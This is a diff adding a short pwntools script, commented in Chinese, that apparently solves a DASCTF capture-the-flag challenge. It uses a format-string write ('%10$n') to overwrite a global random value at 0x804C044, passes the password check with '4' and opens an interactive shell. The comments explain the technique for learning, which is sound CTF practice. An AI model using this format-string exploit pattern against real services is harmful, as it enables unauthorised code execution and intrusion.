@@ -1,0 +1,23 @@
+from pwn import *
+
+# 远程连接
+p = remote("4ac9b047058807ba40a489e3.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="4ac9b047058807ba40a489e3.tcp-ctf2.dasctf.com")
+
+# 接收提示语 "your name:"
+p.recvuntil(b"name:")
+
+# ★ 核心利用点 ★
+# 0x804C044 是存放随机数的全局变量地址。
+# 把这个地址放到 payload 开头，它就会成为 printf 的第 10 个可变参数。
+# "%10$n" 会把前面已经输出的字符数（也就是地址占的 4 个字节）写入到这个地址里。
+# 于是，全局变量里的随机数被强行改写成了 4。
+p.sendline(p32(0x804C044) + b"%10$n")
+
+# 接收提示语 "your passwd:"
+p.recvuntil(b"passwd:")
+
+# 因为上面的全局变量已经被改成了 4，所以这里输入 4，atoi("4") 就能通过校验
+p.sendline(b"4")
+
+# 拿到 shell
+p.interactive()
